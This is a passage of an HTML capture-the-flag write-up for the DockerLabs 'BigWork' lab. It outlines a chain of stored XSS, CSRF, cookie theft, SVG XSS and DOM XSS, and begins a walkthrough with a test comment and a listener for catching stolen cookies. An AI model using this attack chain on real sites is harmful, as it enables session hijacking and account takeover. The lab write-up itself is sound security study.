@@ -1,0 +1,1944 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=1024">
+    <title>BigWork — Dockerlabs Write-up | FLRS</title>
+    <meta name="description"
+        content="Write-up for the BigWork machine on DockerLabs — Difficulty: Intermediate. Stored XSS → CSRF → Session Hijacking → SVG XSS → DOM XSS → CEO Takeover.">
+    <meta name="author" content="Francisco Luis Rivero Sánchez">
+    <meta name="theme-color" content="#0a0a0a">
+
+    <link rel="icon" type="image/x-icon" href="../../assets/favicon.ico">
+    <link rel="apple-touch-icon" href="../../assets/apple-touch-icon.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&family=Inter:ital,wght@0,300;0,400;0,500;1,300&family=JetBrains+Mono:wght@400;500&display=swap"
+        rel="stylesheet">
+
+    <style>
+        html,
+        body {
+            max-width: 100%;
+            /* CAMBIO: Se reemplaza hidden por clip para permitir el position: sticky */
+            overflow-x: clip;
+        }
+
+        :root {
+            --bg: #050810;
+            --bg-2: #07090E;
+            --bg-3: #0E1522;
+            --surface: rgba(10, 14, 24, 0.82);
+            --border: rgba(0, 210, 255, 0.08);
+            --border-h: rgba(0, 210, 255, 0.28);
+            --accent: #00D2FF;
+            --accent-dim: rgba(0, 210, 255, 0.09);
+            --accent-2: #6E5BFF;
+            --text: #D2E6F6;
+            --text-2: #AABCCE;
+            --text-3: #546878;
+            --ok: #00ff88;
+            --warn: #ffaa00;
+            --danger: #ff5050;
+            --font-d: 'Syne', sans-serif;
+            --font-b: 'Inter', sans-serif;
+            --font-m: 'JetBrains Mono', monospace;
+            --glow: 0 0 35px rgba(0, 210, 255, 0.18);
+            --glow-sm: 0 0 16px rgba(0, 210, 255, 0.12);
+            --r: 10px;
+            --ease: cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--font-b);
+            font-size: 16px;
+            line-height: 1.7;
+            font-weight: 300;
+            /* CAMBIO: Se reemplaza hidden por clip */
+            overflow-x: clip;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image: radial-gradient(circle, rgba(0, 210, 255, 0.10) 1px, transparent 1px);
+            background-size: 44px 44px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            width: 700px;
+            height: 700px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(0, 210, 255, 0.04) 0%, transparent 65%);
+            top: -280px;
+            right: -280px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .progress-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            z-index: 300;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--accent);
+            width: 0%;
+            transition: width 0.1s ease;
+            box-shadow: var(--glow-sm);
+        }
+
+        nav {
+            position: fixed;
+            inset: 0 0 auto 0;
+            z-index: 200;
+            padding: 1.4rem 4.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            backdrop-filter: blur(22px) saturate(180%);
+            -webkit-backdrop-filter: blur(22px) saturate(180%);
+            background: rgba(5, 8, 16, 0.72);
+            border-bottom: 1px solid var(--border);
+            transition: border-color 0.3s;
+        }
+
+        .nav-logo {
+            font-family: var(--font-d);
+            font-size: 1.05rem;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            color: var(--text);
+            text-decoration: none;
+        }
+
+        .nav-logo em {
+            font-style: normal;
+            color: var(--accent);
+        }
+
+        .nav-back {
+            font-family: var(--font-m);
+            font-size: 0.72rem;
+            color: var(--text-2);
+            text-decoration: none;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            transition: color 0.2s var(--ease);
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .nav-back:hover {
+            color: var(--accent);
+        }
+
+        .writeup-hero {
+            position: relative;
+            z-index: 1;
+            min-height: 50vh;
+            display: flex;
+            align-items: flex-end;
+            padding: 9rem 5.5rem 4rem;
+            border-bottom: 1px solid var(--border);
+            overflow: hidden;
+        }
+
+        .hero-glow-bg {
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+            background: radial-gradient(ellipse 60% 80% at 10% 60%, rgba(110, 91, 255, 0.05) 0%, transparent 70%);
+        }
+
+        .writeup-hero-content {
+            position: relative;
+            z-index: 2;
+            max-width: 900px;
+        }
+
+        .breadcrumb {
+            font-family: var(--font-m);
+            font-size: 0.68rem;
+            color: var(--text-3);
+            letter-spacing: 0.1em;
+            margin-bottom: 1.2rem;
+            opacity: 0;
+            animation: fadeUp 0.45s var(--ease) 0.05s forwards;
+        }
+
+        .breadcrumb a {
+            color: var(--text-3);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .breadcrumb a:hover {
+            color: var(--accent);
+        }
+
+        .breadcrumb .sep {
+            margin: 0 0.5rem;
+        }
+
+        .breadcrumb .current {
+            color: var(--accent);
+        }
+
+        .writeup-title-h {
+            font-family: var(--font-d);
+            font-size: clamp(3rem, 7vw, 5.5rem);
+            font-weight: 800;
+            letter-spacing: -0.045em;
+            line-height: 0.92;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, #E6F0F8 0%, #7DAFCC 60%, var(--accent) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            opacity: 0;
+            animation: fadeUp 0.65s var(--ease) 0.2s forwards;
+        }
+
+        .writeup-subtitle {
+            font-family: var(--font-m);
+            font-size: 0.8rem;
+            color: var(--text-2);
+            letter-spacing: 0.05em;
+            margin-bottom: 1.8rem;
+            opacity: 0;
+            animation: fadeUp 0.65s var(--ease) 0.35s forwards;
+        }
+
+        .writeup-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.7rem;
+            align-items: center;
+            opacity: 0;
+            animation: fadeUp 0.65s var(--ease) 0.5s forwards;
+        }
+
+        .meta-badge {
+            font-family: var(--font-m);
+            font-size: 0.65rem;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            padding: 0.28rem 0.8rem;
+            border-radius: 4px;
+            border: 1px solid;
+        }
+
+        .badge-intermediate {
+            color: var(--warn);
+            border-color: rgba(255, 170, 0, 0.3);
+            background: rgba(255, 170, 0, 0.05);
+        }
+
+        .badge-docker {
+            color: var(--accent);
+            border-color: rgba(0, 210, 255, 0.25);
+            background: var(--accent-dim);
+        }
+
+        .badge-linux {
+            color: var(--ok);
+            border-color: rgba(0, 255, 136, 0.2);
+            background: rgba(0, 255, 136, 0.04);
+        }
+
+        .badge-xss {
+            color: var(--danger);
+            border-color: rgba(255, 80, 80, 0.25);
+            background: rgba(255, 80, 80, 0.04);
+        }
+
+        .badge-csrf {
+            color: #c44dff;
+            border-color: rgba(196, 77, 255, 0.25);
+            background: rgba(196, 77, 255, 0.04);
+        }
+
+        .badge-web {
+            color: var(--accent-2);
+            border-color: rgba(110, 91, 255, 0.3);
+            background: rgba(110, 91, 255, 0.05);
+        }
+
+        .meta-date {
+            font-family: var(--font-m);
+            font-size: 0.65rem;
+            color: var(--text-3);
+            padding-left: 0.5rem;
+        }
+
+        .writeup-layout {
+            position: relative;
+            z-index: 1;
+            display: grid;
+            grid-template-columns: 1fr 260px;
+            align-items: start;
+            gap: 3.5rem;
+            max-width: 1080px;
+            margin: 0 auto;
+            padding: 4rem 2.5rem;
+        }
+
+        .sidebar {
+            position: sticky;
+            top: 5.5rem;
+            height: fit-content;
+            align-self: start;
+            order: 2;
+        }
+
+        .sidebar-box {
+            border: 1px solid var(--border);
+            border-radius: var(--r);
+            padding: 1.4rem;
+            background: var(--surface);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            margin-bottom: 1.2rem;
+        }
+
+        .sidebar-title {
+            font-family: var(--font-m);
+            font-size: 0.6rem;
+            color: var(--accent);
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            margin-bottom: 1rem;
+        }
+
+        .toc-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 0.2rem;
+        }
+
+        .toc-list a {
+            font-family: var(--font-m);
+            font-size: 0.68rem;
+            color: var(--text-3);
+            text-decoration: none;
+            letter-spacing: 0.04em;
+            transition: all 0.2s;
+            display: block;
+            padding: 0.3rem 0.75rem;
+            border-left: 2px solid transparent;
+            border-radius: 0 4px 4px 0;
+        }
+
+        .toc-list a:hover,
+        .toc-list a.active {
+            color: var(--accent);
+            border-left-color: var(--accent);
+            background: var(--accent-dim);
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.7rem;
+        }
+
+        .info-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .info-label {
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            color: var(--text-3);
+            letter-spacing: 0.05em;
+        }
+
+        .info-val {
+            font-family: var(--font-m);
+            font-size: 0.7rem;
+        }
+
+        .val-accent {
+            color: var(--accent);
+        }
+
+        .val-ok {
+            color: var(--ok);
+        }
+
+        .val-warn {
+            color: var(--warn);
+        }
+
+        .val-danger {
+            color: var(--danger);
+        }
+
+        .val-pur {
+            color: var(--accent-2);
+        }
+
+        .attack-path {
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+        }
+
+        .ap-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 0.8rem;
+            padding: 0.45rem 0;
+        }
+
+        .ap-dot {
+            width: 7px;
+            height: 7px;
+            background: var(--accent);
+            border-radius: 50%;
+            margin-top: 5px;
+            flex-shrink: 0;
+            box-shadow: 0 0 6px rgba(0, 210, 255, 0.6);
+        }
+
+        .ap-line {
+            width: 1px;
+            height: 14px;
+            background: var(--border);
+            margin: 0 3px;
+        }
+
+        .ap-text {
+            font-family: var(--font-m);
+            font-size: 0.63rem;
+            color: var(--text-3);
+            line-height: 1.6;
+        }
+
+        .ap-text span {
+            color: var(--accent);
+        }
+
+        .writeup-content {
+            min-width: 0;
+            order: 1;
+        }
+
+        .section {
+            margin-bottom: 4rem;
+            opacity: 0;
+            transform: translateY(22px);
+            transition: opacity 0.6s var(--ease), transform 0.6s var(--ease);
+        }
+
+        .section.visible {
+            opacity: 1;
+            transform: none;
+        }
+
+        .section-label {
+            font-family: var(--font-m);
+            font-size: 0.65rem;
+            color: var(--accent);
+            letter-spacing: 0.22em;
+            text-transform: uppercase;
+            margin-bottom: 0.4rem;
+        }
+
+        .section-title {
+            font-family: var(--font-d);
+            font-size: 1.6rem;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            color: var(--text);
+            margin-bottom: 0.5rem;
+        }
+
+        .section-line {
+            width: 36px;
+            height: 2px;
+            background: var(--accent);
+            margin-bottom: 2rem;
+            opacity: 0.6;
+        }
+
+        .vuln-title {
+            font-family: var(--font-d);
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--text);
+            margin: 2.5rem 0 1rem;
+            letter-spacing: -0.01em;
+            border-left: 3px solid var(--accent);
+            padding-left: 0.9rem;
+        }
+
+        hr.divider {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 0 0 4rem 0;
+        }
+
+        .prose p {
+            font-size: 1rem;
+            line-height: 2.0;
+            color: var(--text-2);
+            margin-bottom: 1rem;
+        }
+
+        .prose p strong {
+            color: var(--text);
+            font-weight: 500;
+        }
+
+        .prose p .hl {
+            color: var(--accent);
+        }
+
+        .prose p .hl-ok {
+            color: var(--ok);
+        }
+
+        .prose p .hl-warn {
+            color: var(--warn);
+        }
+
+        .prose p .hl-bad {
+            color: var(--danger);
+        }
+
+        .prose p .hl-pur {
+            color: var(--accent-2);
+        }
+
+        .prose p code {
+            font-family: var(--font-m);
+            font-size: 0.85em;
+            color: var(--accent);
+            background: var(--bg-3);
+            padding: 0.05rem 0.35rem;
+            border-radius: 3px;
+        }
+
+        .step-marker {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1rem;
+            margin-top: 2.2rem;
+        }
+
+        .step-num {
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            font-weight: 500;
+            color: var(--bg);
+            background: var(--accent);
+            width: 26px;
+            height: 26px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .step-title {
+            font-family: var(--font-m);
+            font-size: 0.75rem;
+            color: var(--accent);
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+        }
+
+        .cmd-block {
+            background: var(--bg-3);
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--accent);
+            border-radius: 0 var(--r) var(--r) 0;
+            padding: 1rem 1.2rem;
+            margin: 1rem 0;
+            font-family: var(--font-m);
+            font-size: 0.8rem;
+            overflow-x: auto;
+            position: relative;
+            line-height: 1.85;
+        }
+
+        .cmd-label {
+            position: absolute;
+            top: 0.5rem;
+            right: 4.5rem;
+            font-size: 0.58rem;
+            color: var(--text-3);
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+        }
+
+        .cmd-block .prompt {
+            color: var(--accent);
+            user-select: none;
+        }
+
+        .cmd-block .cmd {
+            color: var(--text);
+        }
+
+        .cmd-block .flag {
+            color: var(--accent-2);
+        }
+
+        .cmd-block .arg {
+            color: var(--warn);
+        }
+
+        .cmd-block .comment {
+            color: var(--text-3);
+            font-size: 0.73rem;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.8rem;
+            background: var(--bg-2);
+            border: 1px solid var(--border);
+            color: var(--text-3);
+            font-family: var(--font-m);
+            font-size: 0.6rem;
+            padding: 0.15rem 0.5rem;
+            letter-spacing: 0.08em;
+            cursor: pointer;
+            opacity: 0;
+            transition: opacity 0.2s, background 0.2s, color 0.2s;
+            border-radius: 3px;
+        }
+
+        .cmd-block:hover .copy-btn {
+            opacity: 1;
+        }
+
+        .copy-btn:hover {
+            background: var(--accent);
+            color: #000;
+            border-color: var(--accent);
+        }
+
+        .copy-btn.copied {
+            background: var(--ok);
+            color: #000;
+            border-color: var(--ok);
+            opacity: 1;
+        }
+
+        .output-block {
+            background: #030508;
+            border: 1px solid var(--border);
+            border-radius: var(--r);
+            padding: 1rem 1.2rem;
+            margin: 0.5rem 0 1.5rem;
+            font-family: var(--font-m);
+            font-size: 0.76rem;
+            line-height: 1.9;
+            color: var(--text-2);
+            overflow-x: auto;
+        }
+
+        .o-accent {
+            color: var(--accent);
+        }
+
+        .o-ok {
+            color: var(--ok);
+        }
+
+        .o-warn {
+            color: var(--warn);
+        }
+
+        .o-bad {
+            color: var(--danger);
+        }
+
+        .o-white {
+            color: var(--text);
+            font-weight: 500;
+        }
+
+        .o-pur {
+            color: var(--accent-2);
+        }
+
+        .info-box {
+            border: 1px solid rgba(0, 210, 255, 0.18);
+            background: rgba(0, 210, 255, 0.04);
+            border-radius: var(--r);
+            padding: 1.2rem 1.5rem;
+            margin: 1.2rem 0;
+        }
+
+        .info-box-title {
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            color: var(--accent);
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            margin-bottom: 0.6rem;
+        }
+
+        .info-box p {
+            font-family: var(--font-m);
+            font-size: 0.76rem;
+            color: var(--text-2);
+            line-height: 1.85;
+        }
+
+        .info-box p strong {
+            color: var(--accent);
+        }
+
+        .warn-box {
+            border: 1px solid rgba(255, 170, 0, 0.22);
+            background: rgba(255, 170, 0, 0.04);
+            border-radius: var(--r);
+            padding: 1.2rem 1.5rem;
+            margin: 1.2rem 0;
+        }
+
+        .warn-box-title {
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            color: var(--warn);
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            margin-bottom: 0.6rem;
+        }
+
+        .warn-box p {
+            font-family: var(--font-m);
+            font-size: 0.76rem;
+            color: var(--text-2);
+            line-height: 1.85;
+        }
+
+        .warn-box p strong {
+            color: var(--warn);
+        }
+
+        .danger-box {
+            border: 1px solid rgba(255, 80, 80, 0.22);
+            background: rgba(255, 80, 80, 0.04);
+            border-radius: var(--r);
+            padding: 1.2rem 1.5rem;
+            margin: 1.2rem 0;
+        }
+
+        .danger-box-title {
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            color: var(--danger);
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            margin-bottom: 0.6rem;
+        }
+
+        .danger-box p {
+            font-family: var(--font-m);
+            font-size: 0.76rem;
+            color: var(--text-2);
+            line-height: 1.85;
+        }
+
+        .danger-box p strong {
+            color: var(--danger);
+        }
+
+        .pur-box {
+            border: 1px solid rgba(110, 91, 255, 0.25);
+            background: rgba(110, 91, 255, 0.04);
+            border-radius: var(--r);
+            padding: 1.2rem 1.5rem;
+            margin: 1.2rem 0;
+        }
+
+        .pur-box-title {
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            color: var(--accent-2);
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            margin-bottom: 0.6rem;
+        }
+
+        .pur-box p {
+            font-family: var(--font-m);
+            font-size: 0.76rem;
+            color: var(--text-2);
+            line-height: 1.85;
+        }
+
+        .pur-box p strong {
+            color: var(--accent-2);
+        }
+
+        .vuln-meta-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 0.8rem 0 1.2rem;
+        }
+
+        .vuln-meta-table td {
+            font-family: var(--font-m);
+            font-size: 0.68rem;
+            padding: 0.5rem 0.8rem;
+            border-bottom: 1px solid var(--border);
+            color: var(--text-2);
+        }
+
+        .vuln-meta-table td:first-child {
+            color: var(--text-3);
+            width: 38%;
+        }
+
+        .vuln-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+        }
+
+        .vuln-table th,
+        .vuln-table td {
+            font-family: var(--font-m);
+            font-size: 0.7rem;
+            padding: 0.75rem 1rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .vuln-table th {
+            color: var(--accent);
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            font-weight: 500;
+            border-bottom-color: rgba(0, 210, 255, 0.2);
+        }
+
+        .vuln-table td {
+            color: var(--text-2);
+        }
+
+        .vuln-table td:first-child {
+            color: var(--accent);
+        }
+
+        .glos-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .glos-card {
+            border: 1px solid var(--border);
+            border-radius: var(--r);
+            padding: 1.4rem;
+            background: var(--surface);
+        }
+
+        .glos-term {
+            font-family: var(--font-m);
+            font-size: 0.75rem;
+            color: var(--accent);
+            letter-spacing: 0.06em;
+            margin-bottom: 0.6rem;
+        }
+
+        .glos-def {
+            font-size: 0.85rem;
+            color: var(--text-2);
+            line-height: 1.9;
+        }
+
+        .glos-def strong {
+            color: var(--text);
+            font-weight: 500;
+        }
+
+        .glos-def code {
+            font-family: var(--font-m);
+            font-size: 0.78rem;
+            color: var(--accent);
+            background: var(--bg-3);
+            padding: 0.05rem 0.35rem;
+            border-radius: 3px;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            background: var(--accent);
+            color: #000;
+            padding: 0.65rem 1.3rem;
+            font-family: var(--font-m);
+            font-size: 0.72rem;
+            letter-spacing: 0.1em;
+            border-radius: 5px;
+            opacity: 0;
+            transform: translateY(8px);
+            transition: opacity 0.25s, transform 0.25s;
+            pointer-events: none;
+            z-index: 10000;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        footer {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+            padding: 2rem;
+            border-top: 1px solid var(--border);
+            font-family: var(--font-m);
+            font-size: 0.67rem;
+            color: var(--text-3);
+            letter-spacing: 0.1em;
+        }
+
+        footer em {
+            font-style: normal;
+            color: var(--accent);
+        }
+
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(18px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @media (max-width: 860px) {
+            nav {
+                padding: 1.2rem 1.75rem;
+            }
+
+            .writeup-hero {
+                padding: 7rem 1.75rem 3rem;
+            }
+
+            .writeup-layout {
+                grid-template-columns: 1fr;
+                padding: 3rem 1.75rem;
+            }
+
+            .sidebar {
+                position: static;
+                order: -1;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="progress-container">
+        <div class="progress-bar" id="readingProgress"></div>
+    </div>
+
+    <nav id="nav">
+        <a href="../../" class="nav-logo">franlrs<em>.</em></a>
+        <a href="../../writeups" class="nav-back">← Write-ups</a>
+    </nav>
+
+    <div class="writeup-hero">
+        <div class="hero-glow-bg"></div>
+        <div class="writeup-hero-content">
+            <div class="breadcrumb">
+                <a href="../../">Portfolio</a>
+                <span class="sep">/</span>
+                <a href="../../writeups">Write-ups</a>
+                <span class="sep">/</span>
+                <span class="current">BigWork</span>
+            </div>
+            <h1 class="writeup-title-h">BigWork.</h1>
+            <p class="writeup-subtitle">DockerLabs · Stored XSS → CSRF → Session Hijacking → SVG XSS → DOM XSS → CEO
+                Takeover</p>
+            <div class="writeup-meta">
+                <span class="meta-badge badge-intermediate">Intermediate</span>
+                <span class="meta-badge badge-docker">Dockerlabs</span>
+                <span class="meta-badge badge-linux">Linux</span>
+                <span class="meta-badge badge-xss">XSS</span>
+                <span class="meta-badge badge-csrf">CSRF</span>
+                <span class="meta-badge badge-web">Web Security</span>
+                <span class="meta-date">April 2026</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="writeup-layout">
+
+        <aside class="sidebar">
+
+            <div class="sidebar-box">
+                <p class="sidebar-title">// Machine Info</p>
+                <div class="info-row">
+                    <span class="info-label">Platform</span>
+                    <span class="info-val val-accent">Dockerlabs</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Difficulty</span>
+                    <span class="info-val val-warn">Intermediate</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">OS</span>
+                    <span class="info-val val-ok">Linux</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Port</span>
+                    <span class="info-val val-accent">8000/HTTP</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">App Type</span>
+                    <span class="info-val" style="color:var(--text-2)">Social Network</span>
+                </div>
+            </div>
+
+            <div class="sidebar-box">
+                <p class="sidebar-title">// Contents</p>
+                <ul class="toc-list">
+                    <li><a href="#summary">01 — Summary</a></li>
+                    <li><a href="#vuln01">02 — VULN-01 · Stored XSS</a></li>
+                    <li><a href="#vuln02">03 — VULN-02 · CSRF</a></li>
+                    <li><a href="#vuln03">04 — VULN-03 · Session Hijacking</a></li>
+                    <li><a href="#vuln04">05 — VULN-04 · SVG XSS</a></li>
+                    <li><a href="#vuln05">06 — VULN-05 · DOM XSS</a></li>
+                    <li><a href="#walkthrough">07 — Full Walkthrough</a></li>
+                    <li><a href="#glossary">08 — Glossary</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-box">
+                <p class="sidebar-title">// Attack Path</p>
+                <div class="attack-path">
+                    <div class="ap-item">
+                        <div class="ap-dot"></div>
+                        <div class="ap-text">Register as <span>pingu</span></div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot"></div>
+                        <div class="ap-text"><span>Stored XSS</span> in comments</div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot"></div>
+                        <div class="ap-text"><span>CSRF</span> → mass password change</div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot"></div>
+                        <div class="ap-text">Cookie steal → <span>carlos_vega</span></div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot"></div>
+                        <div class="ap-text">SVG XSS → <span>admin (Sofía)</span></div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot"></div>
+                        <div class="ap-text">DOM XSS → <span>CEO session</span></div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot" style="background:var(--danger);box-shadow:0 0 6px var(--danger)"></div>
+                        <div class="ap-text"><span style="color:var(--danger)">/treasury → PWNED ✓</span></div>
+                    </div>
+                </div>
+            </div>
+
+        </aside>
+
+        <main class="writeup-content" id="main-content">
+
+            <div class="section" id="summary">
+                <p class="section-label">// 01</p>
+                <h2 class="section-title">Summary</h2>
+                <div class="section-line"></div>
+
+                <div class="prose">
+                    <p>
+                        <strong>BigWork</strong> is an <span class="hl-warn">Intermediate</span> difficulty machine
+                        from <span class="hl">DockerLabs</span>. It simulates a LinkedIn-like corporate social
+                        network running on <strong>HTTP port 8000</strong>, purposely designed to practise real
+                        XSS attack scenarios. The application exposes five distinct vulnerabilities that chain
+                        together to escalate from an anonymous user all the way to full CEO account takeover and
+                        access to the company treasury.
+                    </p>
+                    <p>
+                        The attack begins by exploiting a <span class="hl-bad">Stored XSS</span> vulnerability in
+                        the comment section. From there, a <span class="hl-bad">CSRF</span> flaw enables mass
+                        password resets across all users. Session cookies configured without
+                        <span class="hl-bad">HttpOnly</span> allow direct cookie theft, bypassing MFA entirely.
+                        A malicious <span class="hl-bad">SVG file upload</span> grants admin access. Finally, a
+                        <span class="hl-bad">DOM XSS</span> via a reflected URL parameter delivers the CEO's
+                        session cookie and access to the restricted <code>/treasury</code> endpoint.
+                    </p>
+                </div>
+
+                <table class="vuln-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Vulnerability</th>
+                            <th>Impact</th>
+                            <th>CVSS</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>VULN-01</td>
+                            <td>Stored XSS — Comments</td>
+                            <td>Mass JavaScript execution against all viewers</td>
+                            <td style="color:var(--warn)">High</td>
+                        </tr>
+                        <tr>
+                            <td>VULN-02</td>
+                            <td>CSRF — Password Change</td>
+                            <td>Mass account takeover via forced password reset</td>
+                            <td style="color:var(--warn)">High</td>
+                        </tr>
+                        <tr>
+                            <td>VULN-03</td>
+                            <td>Session Hijacking (HttpOnly=false)</td>
+                            <td>Full session theft bypassing MFA</td>
+                            <td style="color:var(--danger)">Critical</td>
+                        </tr>
+                        <tr>
+                            <td>VULN-04</td>
+                            <td>XSS via SVG Upload</td>
+                            <td>Admin session hijacking via file attachment</td>
+                            <td style="color:var(--warn)">High</td>
+                        </tr>
+                        <tr>
+                            <td>VULN-05</td>
+                            <td>DOM XSS — Reflected URL Parameter</td>
+                            <td>CEO session hijacking → treasury access</td>
+                            <td style="color:var(--warn)">High</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="info-box">
+                    <p class="info-box-title">// Ethical hacking context</p>
+                    <p>
+                        All techniques documented in this write-up are applied <strong>exclusively</strong> in
+                        the controlled DockerLabs environment. Using these techniques against systems without
+                        explicit written authorisation is <strong>illegal</strong>. This document is intended
+                        <strong>for educational purposes only</strong>.
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <div class="section" id="vuln01">
+                <p class="section-label">// 02</p>
+                <h2 class="section-title">VULN-01 · Stored XSS</h2>
+                <div class="section-line"></div>
+
+                <table class="vuln-meta-table">
+                    <tr>
+                        <td>Component</td>
+                        <td>BigWork — Post Comment Feature</td>
+                    </tr>
+                    <tr>
+                        <td>Type</td>
+                        <td>Stored Cross-Site Scripting (XSS)</td>
+                    </tr>
+                    <tr>
+                        <td>OWASP</td>
+                        <td>A03:2021 – Injection</td>
+                    </tr>
+                    <tr>
+                        <td>CVSSv3</td>
+                        <td style="color:var(--warn)">High</td>
+                    </tr>
+                    <tr>
+                        <td>Scope</td>
+                        <td>All users viewing any post with a malicious comment</td>
+                    </tr>
+                </table>
+
+                <div class="prose">
+                    <p>
+                        The BigWork application correctly sanitises input in the post-creation feature; however,
+                        it <strong>completely fails to sanitise or encode</strong> HTML/JavaScript submitted
+                        through the comment box. Any authenticated user can inject arbitrary HTML or JavaScript
+                        into a comment, which is stored in the database and rendered in the browser of every
+                        user who views that post — a textbook <span class="hl-bad">Stored (Persistent) XSS</span>.
+                    </p>
+                    <p>
+                        Because the payload is stored server-side, it fires automatically and persistently every
+                        time the post is loaded — <strong>no further interaction from the attacker is required</strong>.
+                    </p>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">1</div>
+                    <span class="step-title">Verify HTML rendering — discovery</span>
+                </div>
+
+                <div class="cmd-block" data-cmd="<b>test HTML</b>">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">COMMENT INPUT</span>
+                    <div><span class="comment"># Submit as a comment on any post:</span></div>
+                    <div><span class="cmd">&lt;b&gt;test HTML&lt;/b&gt;</span></div>
+                </div>
+
+                <div class="output-block">
+                    <div><span class="o-ok">✅ Result: text is rendered as bold — comments are NOT sanitised.</span>
+                    </div>
+                    <div><span class="o-bad">❌ Same payload in a post: displayed as plain text — posts ARE
+                            sanitised.</span></div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">2</div>
+                    <span class="step-title">Deploy spy server and confirm live XSS</span>
+                </div>
+
+                <div class="cmd-block" data-cmd="hostname -I">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">ATTACKER IP</span>
+                    <div><span class="prompt">$ </span><span class="cmd">hostname <span class="flag">-I</span></span>
+                    </div>
+                </div>
+
+                <div class="cmd-block" data-cmd="python3 -m http.server 9999">
